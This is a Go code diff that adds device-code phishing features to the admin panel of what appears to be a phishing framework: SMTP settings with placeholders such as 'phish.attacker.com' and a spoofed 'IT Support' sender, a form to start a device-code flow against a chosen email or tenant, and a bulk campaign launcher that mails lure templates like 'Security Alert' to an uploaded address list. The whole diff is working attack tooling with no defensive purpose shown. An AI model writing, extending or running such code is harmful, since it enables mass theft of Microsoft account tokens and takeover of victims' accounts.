@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"html/template"
+	"io"
 	"net/http"
 	"net/url"
 	"strconv"
@@ -890,6 +891,58 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			http.Redirect(w, r, "/admin/panel?tab=lures", http.StatusSeeOther)
 			return
 
+		case "save_dc_smtp":
+			s.Cfg.SetSmtpHost(r.FormValue("smtp_host"))
+			s.Cfg.SetSmtpPort(r.FormValue("smtp_port"))
+			s.Cfg.SetSmtpUser(r.FormValue("smtp_user"))
+			s.Cfg.SetSmtpPass(r.FormValue("smtp_pass"))
+			s.Cfg.SetSmtpFrom(r.FormValue("smtp_from"))
+			s.Cfg.SetDCLandingHost(r.FormValue("dc_landing_host"))
+			http.Redirect(w, r, "/admin/panel?tab=devicecode&ok=smtp+config+saved", http.StatusSeeOther)
+			return
+
+		case "dc_start":
+			target := strings.TrimSpace(r.FormValue("dc_target"))
+			if target == "" {
+				http.Redirect(w, r, "/admin/panel?tab=devicecode&err=target+required", http.StatusSeeOther)
+				return
+			}
+			_, err := StartDeviceCode(target)
+			if err != nil {
+				http.Redirect(w, r, "/admin/panel?tab=devicecode&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
+				return
+			}
+			log.Info("admin: started device code flow for %s", target)
+			http.Redirect(w, r, "/admin/panel?tab=devicecode&ok=device+code+started", http.StatusSeeOther)
+			return
+
+		case "dc_launch":
+			name := strings.TrimSpace(r.FormValue("dc_campaign_name"))
+			tmpl := strings.TrimSpace(r.FormValue("dc_template"))
+			if name == "" || tmpl == "" {
+				http.Redirect(w, r, "/admin/panel?tab=devicecode&err=campaign+name+and+template+required", http.StatusSeeOther)
+				return
+			}
+
+			file, _, err := r.FormFile("dc_emails_file")
+			if err != nil {
+				http.Redirect(w, r, "/admin/panel?tab=devicecode&err=file+upload+failed", http.StatusSeeOther)
+				return
+			}
+			defer file.Close()
+
+			data, _ := io.ReadAll(file)
+			emails := strings.Split(string(data), "\n")
+
+			camp, err := LaunchCampaign(name, tmpl, emails)
+			if err != nil {
+				http.Redirect(w, r, "/admin/panel?tab=devicecode&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
+				return
+			}
+			log.Info("admin: launched device code campaign '%s' with %d targets", name, len(camp.Targets))
+			http.Redirect(w, r, "/admin/panel?tab=devicecode&ok=campaign+launched", http.StatusSeeOther)
+			return
+
 		case "blacklist_add":
 			ip := strings.TrimSpace(r.FormValue("ip"))
 			if ip != "" && GlobalBlacklist != nil {
@@ -1503,6 +1556,60 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		dcTargets := GetDCTargets()
 		dcCampaigns := GetCampaigns()
 
+		// SMTP Configuration
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("SMTP Configuration"))
+		b.WriteString(fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecode">
+<input type="hidden" name="action" value="save_dc_smtp">
+<div class="form-grid">
+  <div class="field field-full"><label class="field-label">SMTP Host</label><input type="text" name="smtp_host" placeholder="smtp.office365.com" value="%s"></div>
+  <div class="field"><label class="field-label">SMTP Port</label><input type="text" name="smtp_port" placeholder="587" value="%s"></div>
+  <div class="field"><label class="field-label">SMTP User</label><input type="text" name="smtp_user" placeholder="noreply@attacker.com" value="%s"></div>
+  <div class="field"><label class="field-label">SMTP Password</label><input type="password" name="smtp_pass" placeholder="password"></div>
+  <div class="field field-full"><label class="field-label">From Address</label><input type="text" name="smtp_from" placeholder="IT Support <support@attacker.com>" value="%s"></div>
+  <div class="field field-full"><label class="field-label">DC Landing Host</label><input type="text" name="dc_landing_host" placeholder="phish.attacker.com" value="%s"></div>
+</div>
+<button type="submit" class="btn btn-blue">Save SMTP Config</button>
+</form></div></div>`,
+			template.HTMLEscapeString(s.Cfg.GetSmtpHost()),
+			fmt.Sprintf("%d", s.Cfg.GetSmtpPort()),
+			template.HTMLEscapeString(s.Cfg.GetSmtpUser()),
+			template.HTMLEscapeString(s.Cfg.GetSmtpFrom()),
+			template.HTMLEscapeString(s.Cfg.GetDCLandingHost()),
+		))
+
+		// Start Single Target
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Start Single Device Code Flow"))
+		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecode">
+<input type="hidden" name="action" value="dc_start">
+<div class="form-grid">
+  <div class="field field-full"><label class="field-label">Email or Tenant</label><input type="text" name="dc_target" placeholder="user@company.com or company.onmicrosoft.com" required></div>
+</div>
+<button type="submit" class="btn btn-blue">Start Device Code Flow</button>
+</form></div></div>`)
+
+		// Launch Bulk Campaign
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Launch Bulk Campaign"))
+		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecode" enctype="multipart/form-data">
+<input type="hidden" name="action" value="dc_launch">
+<div class="form-grid">
+  <div class="field"><label class="field-label">Campaign Name</label><input type="text" name="dc_campaign_name" placeholder="Q4 Security Audit" required></div>
+  <div class="field"><label class="field-label">Email Template</label>
+    <select name="dc_template" required>
+      <option value="security_alert">Security Alert (Default)</option>
+      <option value="it_helpdesk">IT Helpdesk</option>
+      <option value="custom">Custom (from letter.html)</option>
+    </select>
+  </div>
+  <div class="field field-full"><label class="field-label">Emails File (one per line)</label><input type="file" name="dc_emails_file" accept=".txt,.csv" required></div>
+</div>
+<button type="submit" class="btn btn-blue">Launch Campaign</button>
+<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Requires SMTP configured above</span>
+</form></div></div>`)
+
+		// Campaigns
 		b.WriteString(`<div class="section">`)
 		b.WriteString(sectionHd(fmt.Sprintf("Campaigns (%d)", len(dcCampaigns))))
 		if len(dcCampaigns) == 0 {
@@ -1538,6 +1645,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		}
 		b.WriteString(`</div>`)
 
+		// Targets
 		b.WriteString(`<div class="section">`)
 		b.WriteString(sectionHd(fmt.Sprintf("Targets (%d)", len(dcTargets))))
 		if len(dcTargets) == 0 {
